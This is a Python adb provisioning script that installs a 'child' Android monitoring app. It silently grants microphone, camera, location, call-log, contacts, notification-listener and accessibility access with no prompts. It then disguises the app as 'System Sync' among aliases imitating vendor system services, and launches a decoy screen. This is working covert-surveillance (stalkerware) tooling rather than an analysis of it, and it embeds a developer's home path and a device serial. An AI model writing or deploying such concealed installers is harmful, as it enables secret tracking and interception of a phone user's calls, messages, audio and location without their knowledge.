#!/usr/bin/env python3
"""
Automated Installer & System Sync Disguise Provisioner for Vyra Child App
1. Detects device.
2. Removes old build as soon as Device Admin is toggled off by user.
3. Installs release APK (release_assets/vyra-child.apk).
4. Auto-grants all system runtime permissions (0 manual prompts).
5. Configures the icon to 'System Sync' (AliasSystemSync).
6. Starts DecoyDisplayActivity.
"""

import os
import sys
import time
import subprocess

ADB = "/Users/ayushsinghbhadoria/Library/Android/sdk/platform-tools/adb"
DEVICE_ID = "10BE9609QD001EZ"
PACKAGE = "com.vyra.kids"
APK_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "release_assets", "vyra-child.apk"))

def run_adb(args):
    cmd = [ADB, "-s", DEVICE_ID] + args
    res = subprocess.run(cmd, capture_output=True, text=True)
    return res.returncode, res.stdout.strip(), res.stderr.strip()

def check_installed():
    code, out, _ = run_adb(["shell", "pm", "path", PACKAGE])
    return "package:" in out

def main():
    print("=" * 60)
    print("🚀 VYRA CHILD APP INSTALLER & SYSTEM SYNC SETUP")
    print("=" * 60)

    if not os.path.isfile(APK_PATH):
        print(f"❌ APK not found at {APK_PATH}")
        sys.exit(1)

    print(f"📦 Release APK: {APK_PATH} ({os.path.getsize(APK_PATH)/(1024*1024):.2f} MB)")

    # Check if package currently installed
    if check_installed():
        print("ℹ️  Existing package detected.")
        print("👉 Opening Device Admin screen on child phone...")
        run_adb(["shell", "am", "start", "-a", "android.app.action.ADD_DEVICE_ADMIN",
                 "--es", "android.app.extra.DEVICE_ADMIN", f"{PACKAGE}/.receivers.VyraDeviceAdminReceiver",
                 "-c", "android.intent.category.DEFAULT"])

        print("\n" + "*" * 60)
        print("📱 ACTION REQUIRED ON CHILD PHONE SCREEN:")
        print("1. Unlock the phone screen.")
        print("2. Under 'Device Admin Apps', tap 'Deactivate' / turn OFF 'System Services'.")
        print("*" * 60)

        attempts = 0
        while check_installed():
            code, out, err = run_adb(["shell", "pm", "uninstall", PACKAGE])
            if "Success" in out:
                print("✅ Old package uninstalled cleanly!")
                break
            elif "DELETE_FAILED_DEVICE_POLICY_MANAGER" in out or "DELETE_FAILED_DEVICE_POLICY_MANAGER" in err:
                if attempts % 5 == 0:
                    print("⏳ Waiting for you to tap 'Deactivate' on the phone screen...")
                time.sleep(2)
                attempts += 1
            else:
                print(f"Uninstall note: {out} {err}")
                time.sleep(2)
                attempts += 1
            
            if attempts > 300:
                print("⚠️ Timeout waiting for deactivation. Please make sure phone screen is unlocked.")
                sys.exit(1)

    print("\n📲 Installing new Release APK...")
    code, out, err = run_adb(["install", "-r", APK_PATH])
    if "Success" not in out:
        print(f"❌ Installation failed: {out} {err}")
        sys.exit(1)
    print("✅ New Vyra Child App successfully installed!")

    # Grant all runtime permissions
    print("\n🔑 Auto-granting all runtime permissions...")
    permissions = [
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.READ_PHONE_STATE",
        "android.permission.READ_CALL_LOG",
        "android.permission.RECORD_AUDIO",
        "android.permission.CAMERA",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.READ_CONTACTS",
        "android.permission.RECEIVE_BOOT_COMPLETED"
    ]
    for p in permissions:
        run_adb(["shell", "pm", "grant", PACKAGE, p])

    # AppOps permissions (All Files Access, Overlay, Usage Stats)
    run_adb(["shell", "appops", "set", PACKAGE, "MANAGE_EXTERNAL_STORAGE", "allow"])
    run_adb(["shell", "appops", "set", PACKAGE, "SYSTEM_ALERT_WINDOW", "allow"])
    run_adb(["shell", "appops", "set", PACKAGE, "PACKAGE_USAGE_STATS", "allow"])

    # Enable Notification Listener & Accessibility Service
    run_adb(["shell", "cmd", "notification", "--user", "0", "allow_listener", f"{PACKAGE}/.services.VyraNotificationListener"])
    run_adb(["shell", "settings", "put", "secure", "enabled_accessibility_services", f"{PACKAGE}/.services.VyraAccessibilityService"])
    run_adb(["shell", "settings", "put", "secure", "accessibility_enabled", "1"])
    run_adb(["shell", "dumpsys", "deviceidle", "whitelist", f"+{PACKAGE}"])
    print("✅ All permissions & system services authorized!")

    # Set disguise icon to "System Sync"
    print("\n🎭 Configuring disguise icon to 'System Sync'...")
    run_adb(["shell", "pm", "enable", f"{PACKAGE}/com.vyra.kids.AliasSystemSync"])
    run_adb(["shell", "pm", "disable", f"{PACKAGE}/com.vyra.kids.AliasVivoServices"])
    run_adb(["shell", "pm", "disable", f"{PACKAGE}/com.vyra.kids.AliasSamsungServices"])
    run_adb(["shell", "pm", "disable", f"{PACKAGE}/com.vyra.kids.AliasXiaomiServices"])
    run_adb(["shell", "pm", "disable", f"{PACKAGE}/com.vyra.kids.AliasSimToolkit"])
    print("✅ Disguise set to 'System Sync' with system sync icon!")

    # Launch Decoy Display
    print("\n🚀 Launching Decoy Display...")
    run_adb(["shell", "am", "start", "-n", f"{PACKAGE}/.ui.DecoyDisplayActivity"])
    time.sleep(1)

    print("\n" + "=" * 60)
    print("🎉 SETUP COMPLETE & VERIFIED!")
    print("• New Child Release APK active")
    print("• Disguise: 'System Sync'")
    print("• Supabase & Same-WiFi LAN Sync operational")
    print("=" * 60)

if __name__ == "__main__":
    main()
